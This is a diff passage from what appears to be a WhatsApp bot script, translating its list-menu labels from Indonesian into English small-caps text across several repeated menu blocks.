-          title: "ғɪᴛᴜʀ ʀᴠɪᴅᴇᴏ",
-          description: "🎥 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ʀᴘʜᴏᴛᴏ",
-          description: "📷 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ʀᴀɴᴅᴏᴍ ғᴏᴛᴏ",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ sᴛɪᴄᴋᴇʀ",
-          description: "📝 ᴍᴇᴍᴜɴᴄᴜᴋᴀɴ ғɪᴛᴜʀ sᴛɪᴄᴋᴇʀ",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ǫᴜᴏᴛᴇs",
-          description: "💬 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴋᴀᴛᴀ-ᴋᴀᴛᴀ",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ sᴛᴀʟᴋ",
-          description: "🔍 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ sᴛᴀʟᴋɪɴɢ",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ʙᴜɢ ᴡᴀ",
-          description: "🐛 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ʙᴜɢ",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
-          description: "🌐 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
-          description: "⚙ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `ʟᴀɪɴɴʏᴀ`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
           title: "sᴄʀɪᴘᴛ",
-          description: "💳 sᴄ ɪɴɪ ғʀᴇᴇ ɴᴏ ᴇɴᴄ 100%",          id: `script`, 
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
           title: "ɪɴғᴏ ʙᴏᴛ",
-          description: "📋 ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ɪɴғᴏʀᴍᴀsɪ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -4396,186 +4592,181 @@ case 'allmenu': {
 hydro.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
 let HydroSad = `${allmenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -4613,186 +4804,181 @@ break
 case 'gamemenu': {
    let HydroSad = `${gamemenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
+          title: "ᴘʜᴏᴛᴏ ᴇᴅɪᴛ",
+          description: "🖼️ sʜᴏᴡ ᴘʜᴏᴛᴏ ᴇᴅɪᴛɪɴɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.ephoto360menu`, 
         },
         {
-          title: "Fun Menu",
-          description: "🥳 Menampilkan Fun Menu",
+          title: "ғᴜɴ",
+          description: "🥳 sʜᴏᴡ ғᴜɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.funmenu`, 
         },
         {
-          title: "Islamic Menu",
-          description: "🕌 Menampilkan Islamic Menu",
+          title: "ɪsʟᴀᴍɪᴄ",
+          description: "🕌 sʜᴏᴡ ɪsʟᴀᴍɪᴄ ғᴇᴀᴛᴜʀᴇs",
           id: `.islamimenu`, 
         },
         {
-          title: "Database Menu",
-          description: "🖥️ Menampilkan Database Menu",
+          title: "ᴅᴀᴛᴀʙᴀsᴇ",
+          description: "🖥️ sʜᴏᴡ ᴅᴀᴛᴀʙᴀsᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.databasemenu`, 
         },
         {
-          title: "Others Menu",
-          description: "📪 Menampilkan Others Menu",
+          title: "ᴏᴛʜᴇʀ",
+          description: "📪 sʜᴏᴡ ᴏᴛʜᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.othermenu`, 
         },
         {
-          title: "RPG Menu",
-          description: "🧰 Menampilkan RPG Menu",
+          title: "ʀᴘɢ",
+          description: "🧰 sʜᴏᴡ ʀᴘɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.rpgmenu`, 
         },
         {
-          title: "Domain Menu",
-          description: "🌐 Menampilkan Domain Menu",
+          title: "sᴜʙᴅᴏᴍᴀɪɴ",
+          description: "🌐 sʜᴏᴡ sᴜʙᴅᴏᴍᴀɪɴ ᴄʀᴇᴀᴛɪᴏɴ",
           id: `.domainmenu`, 
         },
         {
-          title: "Anonymous Menu",
-          description: "👤 Menampilkan Anonymous Menu",
+          title: "ᴀɴᴏɴʏᴍᴏᴜs",
+          description: "👤 sʜᴏᴡ ᴀɴᴏɴʏᴍᴏᴜs ғᴇᴀᴛᴜʀᴇs",
           id: `.anonymousmenu`, 
         },
         {
-          title: "Random Video Menu",
-          description: "🎥 Menampilkan Random Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
+          description: "🎥 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴠɪᴅᴇᴏ",
           id: `.randomvideomenu`, 
         },
         {
-          title: "Random Photo Menu",
-          description: "📷 Menampilkan Photo Video Menu",
+          title: "ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
+          description: "📷 sʜᴏᴡ ʀᴀɴᴅᴏᴍ ᴘʜᴏᴛᴏ",
           id: `.randomphotomenu`, 
         },
         {
-          title: "Sticker Menu",
-          description: "📝 Menampilkan Sticker Menu",
+          title: "sᴛɪᴄᴋᴇʀ",
+          description: "📝 sʜᴏᴡ sᴛɪᴄᴋᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.stickermenu`, 
         },
         {
-          title: "Quotes Menu",
-          description: "💬 Menampilkan Quotes Menu",
+          title: "ǫᴜᴏᴛᴇs",
+          description: "💬 sʜᴏᴡ ǫᴜᴏᴛᴇs",
           id: `.quotesmenu`, 
         },
         {
-          title: "Stalker Menu",
-          description: "🔍 Menampilkan Stalker Menu",
+          title: "sᴛᴀʟᴋ",
+          description: "🔍 sʜᴏᴡ sᴛᴀʟᴋɪɴɢ",
           id: `.stalkermenu`, 
         },
         {
-          title: "Bug Menu",
-          description: "🐛 Menampilkan Bug Menu",
+          title: "ʙᴜɢ",
+          description: "🐛 sʜᴏᴡ ʙᴜɢ ғᴇᴀᴛᴜʀᴇs",
           id: `.bugmenu`, 
         },
         {
-          title: "Digital Ocean Menu",
-          description: "🌐 Menampilkan Digital Ocean Menu",
+          title: "ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ",
+          description: "🌐 sʜᴏᴡ ᴅɪɢɪᴛᴀʟᴏᴄᴇᴀɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.digitaloceanmenu`, 
         },
         {
-          title: "Pyterodactyle Menu",
-          description: "⚙️ Menampilkan Pyterodactyle Menu",
+          title: "ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ",
+          description: "⚙ sʜᴏᴡ ᴘᴛᴇʀᴏᴅᴀᴄᴛʏʟ ғᴇᴀᴛᴜʀᴇs",
           id: `.pyterodactylemenu`, 
         },
       ]
     },
     {
-      title: `Dokumentasi asli dari script ini`, 
-      highlight_label: ``,
+      title: `ᴏᴛʜᴇʀ`, 
       rows: [
         {
-          title: "Script",
-          description: "💳 script ini gratis 100%",          id: `script`, 
+          title: "sᴄʀɪᴘᴛ",
+          description: "💳 ᴛʜɪs sᴄʀɪᴘᴛ ɪs ғʀᴇᴇ & ɴᴏ ᴇɴᴄ",
+          id: `script`, 
         },
         {
           title: "ʀᴀᴛɪɴɢ",
-          description: "🌟 ʀᴀᴛɪɴɢ ʙᴏᴛ ɪɴɪ",
+          description: "🌟 ʀᴀᴛᴇ ᴛʜɪs ʙᴏᴛ",
           id: `.rating`,
         },
         {
-          title: "Info Bot",
-          description: "📋 Informasi total fitur dan lainnya",
+          title: "ɪɴғᴏ ʙᴏᴛ",
+          description: "📋 sʜᴏᴡ ʙᴏᴛ ɪɴғᴏ",
           id: `.infobot`, 
         },
       ]
@@ -4806,186 +4992,181 @@ break
 case 'cpanelmenu': {
    let HydroSad = `${cpanelmenu(prefix, hituet)}`
 const bet = {
-  title: "LIST MENU",
+  title: "ʟɪsᴛ ᴍᴇɴᴜ",
   sections: [
     {
-      title: `List menu yang sering dipakai`, 
-      highlight_label: `Populer`,
+      title: `Frequently Used Menu`, 
+      highlight_label: `Popular`,
       rows: [
         {
-          title: "All Menu",
-          description: "📌 Menampilkan All Menu",
+          title: "sᴇᴍᴜᴀ ғɪᴛᴜʀ",
+          description: "📌 sʜᴏᴡ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.allmenu`, 
         },
       ]
     },
     {
-      title: `List menu yang dipisahkan`, 
+      title: `sᴇᴘᴀʀᴀᴛᴇᴅ ᴍᴇɴᴜ`, 
       highlight_label: ``,
       rows: [
         {
-          title: "Baca Peraturan",
-          description: "🎉 Menampilkan peraturan",
+          title: "ʀᴜʟᴇs",
+          description: "🎉 sʜᴏᴡ ʙᴏᴛ ʀᴜʟᴇs",
           id: `.bacaperaturan`, 
         },
         {
-          title: "Donasi",
-          description: "💸 Menampilkan menu donasi",
+          title: "ᴅᴏɴᴀᴛɪᴏɴ",
+          description: "💸 sᴜᴘᴘᴏʀᴛ ᴛʜᴇ ʙᴏᴛ ᴛᴏ ɢʀᴏᴡ",
           id: `.donasi`, 
         },
         {
-          title: "Owner Menu",
-          description: "👤 Menampilkan Owner Menu",
+          title: "ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
+          description: "👤 sʜᴏᴡ ᴏᴡɴᴇʀ ғᴇᴀᴛᴜʀᴇs",
           id: `.ownermenu`, 
         },
         {
-          title: "Group Menu",
-          description: "👥 Menampilkan Group Menu",
+          title: "ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "👥 sʜᴏᴡ ɢʀᴏᴜᴘ ғᴇᴀᴛᴜʀᴇs",
           id: `.groupmenu`, 
         },
         {
-          title: "ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          description: "⚡ ᴍᴇᴍᴜɴᴄᴜʟᴋᴀɴ ғɪᴛᴜʀ ᴊᴀꜱʜᴇʀ",
-          id: `.jashermenu`, 
-        },
-        {
-          title: "Games Menu",
-          description: "🎮 Menampilkan Games Menu",
+          title: "ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
+          description: "🎮 sʜᴏᴡ ɢᴀᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.gamemenu`, 
         },
         {
-          title: "Store Menu",
-          description: "🛍️ Menampilkan Store Menu",
+          title: "sʜᴏᴘ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛍️ sʜᴏᴡ sᴛᴏʀᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.storemenu`, 
         },
         {
-          title: "Cpanel Menu",
-          description: "🛠️ Menampilkan Cpanel Menu",
+          title: "ᴄᴘᴀɴᴇʟ ғᴇᴀᴛᴜʀᴇs",
+          description: "🛠️ sʜᴏᴡ ᴘᴀɴᴇʟ ᴄʀᴇᴀᴛɪᴏɴ ғᴇᴀᴛᴜʀᴇs",
           id: `.cpanelmenu`, 
         },
         {
-          title: "Ngepush Menu", 
-          description: "💾 Menampilkan Ngepush Menu",
+          title: "ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs", 
+          description: "💾 sʜᴏᴡ ᴘᴜsʜ ғᴇᴀᴛᴜʀᴇs",
           id: `.pushmenu`, 
         },
         {
-          title: "Download Menu",
-          description: "📂 Menampilkan Download Menu",
+          title: "ᴅᴏᴡɴʟᴏᴀᴅᴇʀ",
+          description: "📂 sʜᴏᴡ ᴅᴏᴡɴʟᴏᴀᴅ ғᴇᴀᴛᴜʀᴇs (ɪɢ/ᴛᴛ/ʏᴛ)",
           id: `.downloadmenu`, 
         },
         {
-          title: "AI Menu",
-          description: "🤖 Menampilkan AI Menu",
+          title: "ᴀɪ",
+          description: "🤖 sʜᴏᴡ ᴀɪ ғᴇᴀᴛᴜʀᴇs",
           id: `.aimenu`, 
         },
         {
-          title: "NSFW Menu",
-          description: "🔞 Menampilkan NSFW Menu",
+          title: "18+",
+          description: "🔞 sʜᴏᴡ 18+ ғᴇᴀᴛᴜʀᴇs",
           id: `.nsfwmenu`, 
         },
         {
-          title: "Anime Menu",
-          description: "🤍 Menampilkan NSFW Menu",
+          title: "ᴀɴɪᴍᴇ",
+          description: "🤍 sʜᴏᴡ ᴀɴɪᴍᴇ ғᴇᴀᴛᴜʀᴇs",
           id: `.animemenu`, 
         },
         {
-          title: "Ephoto360 Menu",
-          description: "🖼️ Menampilkan Ephoto360 Menu",
